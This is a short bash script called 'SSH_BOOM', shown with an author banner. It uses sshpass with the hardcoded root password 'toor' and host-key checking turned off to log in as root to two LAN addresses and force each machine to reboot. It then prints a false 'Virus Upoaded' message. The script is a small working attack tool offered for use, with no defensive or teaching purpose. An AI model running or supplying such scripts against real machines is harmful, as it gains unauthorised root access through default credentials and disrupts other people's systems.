#!/bin/bash

echo ""
echo -e " 		      #\033[1;31m ##################################################\033[0m"
echo -e " 		      # \033[1;37mFollow me on Insta : utkarsh_singh_thakur\033[0m"
echo -e " 		      # \033[1;37mAuthor : Utkarsh_Singh\033[0m"
echo -e " 		      # \033[1;31m###********************\033[0m"
echo -e " 		      # \033[6m*****\033[1;34m SSH_BOOM \033[0m\033[6m*****\033[0m"
echo -e " 		      # \033[1;31m#######\033[0m"
echo -e " 		      # \033[1;31m##\033[0m"
read -p " Lets Do This [Y/N] : " ync
while true ; do

case $ync in 

	[Yy]* )
	 ssh-keygen -f "/root/.ssh/known_hosts" -R "192.168.43.211"
	  echo ""
	   echo -e " 			\033[7m Setup Done* \033[0m"
	    sleep 1
	     echo ""
	      sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@192.168.43.211 'reboot'
	echo ""
	 echo -e "			\033[7m Setup Done* \033[0m"
	  sleep 1
	   echo""
	    ssh-keygen -f "/root/.ssh/known_hosts" -R "192.168.43.219"
	     sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@192.168.43.219 'reboot'
	      sleep 2
	echo""
	 echo -e " 		      \033[7mVirus Upoaded..!!\033[0m"
	  echo ""
	   exit;;
	    [Nn]* ) 
              exit;;
	        [Cc]* ) exit;;
      		  esac
    		   done
